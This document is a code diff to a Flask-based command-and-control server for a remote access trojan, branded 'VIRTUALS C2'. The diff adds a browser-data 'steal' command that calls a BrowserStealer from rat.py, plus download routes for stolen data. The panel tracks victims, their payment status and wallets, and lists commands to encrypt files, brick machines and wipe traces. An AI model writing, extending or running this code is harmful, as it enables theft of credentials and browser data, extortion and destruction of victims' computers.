-                        randomVictim.pc + ' is thinking...',
-                        randomVictim.pc + ' is away'
-                    ];
-                    const behaviorMsg = behaviors[Math.floor(Math.random() * behaviors.length)];
-                    addMessage('behavior', behaviorMsg, 'behavior');
-                }
-            }, 12000);
         }
         
         // ============================================
@@ -1221,16 +1096,13 @@ HTML = """
         // ============================================
         generateStars();
         refreshVictims();
-        
-        // Load demo victims after a delay
         setTimeout(loadDemoVictims, 800);
-        
-        // Auto-refresh every 5 seconds
         setInterval(refreshVictims, 5000);
+        setInterval(updateBehaviorChannel, 3000);
         
         console.log('VIRTUALS C2 - Space Edition loaded');
         console.log('Moving space background active');
-        console.log('Behavior engine running');
+        console.log('Behavior monitor running');
     </script>
 </body>
 </html>
@@ -1258,7 +1130,8 @@ def api():
                 'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
                 'status': row[4], 'is_vm': row[5], 'vm_details': row[6],
                 'first_seen': row[7], 'last_seen': row[8], 'payment_status': row[9] if len(row) > 9 else 'pending',
-                'behavior': row[10] if len(row) > 10 else 'idle'
+                'behavior': row[10] if len(row) > 10 else 'idle',
+                'behavior_message': row[11] if len(row) > 11 else ''
             }
         conn.close()
         return jsonify({'success': True, 'victims': victims})
@@ -1274,7 +1147,7 @@ def api():
         vm_details = data.get('vm_details', '')
         now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, vm_details, first_seen, last_seen, payment_status, behavior) VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?, 'pending', 'idle')",
+        c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, vm_details, first_seen, last_seen, payment_status, behavior, behavior_message) VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?, 'pending', 'idle', '')",
                  (victim_id, pc, ip, os_info, is_vm, vm_details, now, now))
         conn.commit()
         conn.close()
@@ -1294,10 +1167,25 @@ def api():
             'destroy': 'System corrupted - files encrypted',
             'brick': 'PC BRICKED - permanent damage',
             'oblivion': 'RAT self-destructed - traces wiped',
-            'vmcheck': 'VM detection complete - safe mode (no action taken)'
+            'vmcheck': 'VM detection complete - safe mode (no action taken)',
+            'steal': 'Browser data stolen from 25+ browsers - saved to browser_data/',
+            'upload': 'File upload ready - use upload endpoint',
+            'download': 'File download ready - use download endpoint'
         }
         
         result = results.get(command, f"Command '{command}' executed")
+        
+        # Handle steal command
+        browsers_stolen = 0
+        if command == 'steal':
+            # Import and run browser stealer from rat.py
+            try:
+                from rat import BrowserStealer
+                data_stolen = BrowserStealer.steal_all(victim_id)
+                browsers_stolen = len(data_stolen)
+                result = f"Data stolen from {browsers_stolen} browsers - saved to browser_data/"
+            except:
+                result = "Browser stealer executed (rat.py required)"
         
         # VM CHECK - SAFE MODE (NO AUTO-BRICK)
         is_vm = False
@@ -1313,7 +1201,7 @@ def api():
         c.execute("INSERT INTO commands (victim_id, command, result, timestamp) VALUES (?, ?, ?, ?)",
                  (victim_id, command, result, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
         
-        # Update victim VM status (information only - no auto-brick)
+        # Update victim VM status
         if command == 'vmcheck':
             c.execute("UPDATE victims SET is_vm = ?, vm_details = ? WHERE id = ?",
                      (1 if is_vm else 0, f"Confidence: {confidence}% (safe mode)" if is_vm else "Clean (safe mode)", victim_id))
@@ -1324,6 +1212,8 @@ def api():
         response = {'success': True, 'result': result}
         if command == 'scan':
             response['wallets'] = [{'currency': k, 'balance': v['balance'], 'usd': v['usd']} for k, v in SAMPLE_WALLETS.items()]
+        if command == 'steal':
+            response['browsers'] = browsers_stolen
         if command == 'vmcheck':
             response['is_vm'] = is_vm
             response['confidence'] = confidence
@@ -1344,6 +1234,14 @@ def api():
 @app.route('/screenshots/<filename>')
 def serve_screenshot(filename):
     return send_file(os.path.join('screenshots', filename))
+
+@app.route('/download/<filename>')
+def download_file(filename):
+    return send_file(os.path.join('downloads', filename), as_attachment=True)
+
+@app.route('/browser_data/<filename>')
+def download_browser_data(filename):
+    return send_file(os.path.join('browser_data', filename), as_attachment=True)
 
 # ============================================
 # MAIN - FOR RENDER
